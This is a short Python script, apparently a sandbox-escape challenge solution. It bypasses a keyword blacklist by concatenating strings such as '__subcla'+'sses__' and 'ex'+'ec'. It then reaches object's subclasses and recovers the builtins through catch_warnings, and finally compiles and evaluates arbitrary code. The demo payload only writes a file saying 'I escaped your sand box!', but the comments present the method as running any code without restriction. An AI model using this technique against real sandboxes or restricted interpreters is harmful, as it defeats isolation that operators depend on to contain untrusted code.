#build prohibited word cl4ss by concatenating strings
str = '__cla'
str = str + 'ss__'

#since object is not in builtns
#get object cl4ss from first base cl4ss of a tuple
object = ().__getattribute__(str).__bases__[0]

#build prohibited word subcl4sses by concatenating strings
str = '__subcla'
str = str + 'sses__'

#build prohibited word builtns by concatenating strings
str2 = '__built'
str2 = str2 + 'ins__'

#get builtns from the catch_warnings subcl4ss
originalBuiltns = object.__getattribute__(object, str)()[60]()._module.__getattribute__(str2)

#create a new namespace that contains all the builtns
namespace = {}
namespace[str2] = originalBuiltns

#run any code by bypassing prohibited words using concatenated strings without any restrictions
code = "im" + "port s" + "ys\n"
code = code + "f = op" + "en('escaped.txt', 'w')\n"
code = code + "f.wr" + "ite('I escaped your sand box!')"

#compile and eval since the word ex+ec is prohibited
mode = "ex" + "ec"
eval(compile(code, '<string>', mode))